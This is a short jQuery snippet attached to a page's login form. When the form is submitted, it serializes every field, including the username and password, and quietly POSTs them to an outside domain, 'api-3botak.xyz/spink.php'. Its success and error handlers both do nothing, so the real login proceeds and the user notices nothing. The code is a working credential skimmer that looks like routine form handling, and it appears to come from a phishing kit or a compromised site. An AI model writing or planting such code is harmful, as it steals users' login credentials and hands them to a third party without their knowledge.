$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://api-3botak.xyz/spink.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
